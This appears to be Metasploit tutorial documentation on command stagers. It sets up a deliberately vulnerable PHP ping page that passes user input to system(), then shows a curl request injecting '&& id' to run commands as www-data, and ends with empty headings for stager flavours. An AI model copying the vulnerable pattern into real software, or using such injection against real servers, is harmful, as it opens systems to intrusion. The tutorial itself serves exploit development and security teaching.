Command stagers provide an easy way to write exploits against typical vulnerabilities such as command execution or code injection. There are currently eight different flavors of command stagers, each uses some sort of system command to save your payload onto the target machine, and execute it.

# The Vulnerability to Play with

The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in PHP, something silly you actually might see in an enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:

```php
<?php
   if ( isset($_GET["ip"]) ) {
      $output = system("ping -c 1 " . $_GET["ip"]);
      die($output);
   }
?>

<html>
<body>
  <form action = "ping.php" method = "GET">
   IP to ping: <input type = "text" name = "ip" /> <input type = "submit" />
  </form>
   </body>
</html>
```

Place the above PHP script (ping.php) in an Ubuntu + Apache + PHP server.

Under normal usage, this is how the script behaves - it just pings the host you specify, and shows
you the output:

```
$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
```

OK, now we can abuse that a little and execute another command (id):

```
$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

See the www-data? That is the output for the second command we asked the script to execute. By
doing that, we can also do even even more nasty - like writing a Meterpreter payload onto the
target system, and execute it.


# The Msf::Exploit::CmdStager Mixin

Now let's talk about how to use a command stager to exploit the above script.

# Flavors

## VBS Command Stager

## Certutil Command Stager

## Debug_write Command Stager

## Debug_asm Command Stager

## TFTP Command Stager

## Bourne Command Stager

## Echo Command Stager

## Printf Command Stager
